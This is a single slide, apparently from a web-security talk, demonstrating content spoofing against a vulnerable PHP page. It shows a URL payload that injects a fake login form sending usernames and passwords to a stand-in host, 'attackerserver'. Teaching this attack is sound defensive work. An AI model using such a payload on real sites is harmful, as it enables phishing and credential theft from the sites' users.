<section class="slide" id="<?= getSlideId(__FILE__) ?>">
    <div>
        <span class="chapter">Content Spoofing</span>
        <div class="small">
        <?php echo code('html', 'http://127.0.0.1/vulnerable.php?name=test') ?>
        <pre class="code next"><code class="html" style="white-space:normal">http://127.0.0.1/vulnerable.php?name=&lt;h3&gt;Please Enter Your Username and Password to Proceed:&lt;/h3&gt;&lt;form method=&quot;POST&quot; action=&quot;http://attackerserver/login.php&quot;&gt;Username: &lt;input type=&quot;text&quot; name=&quot;username&quot; /&gt;&lt;br /&gt;Password: &lt;input type=&quot;password&quot; name=&quot;password&quot; /&gt;&lt;br /&gt;&lt;input type=&quot;submit&quot; value=&quot;Login&quot; /&gt;&lt;/form&gt;&lt;!--</code></pre>
        </div>
    </div>
</section>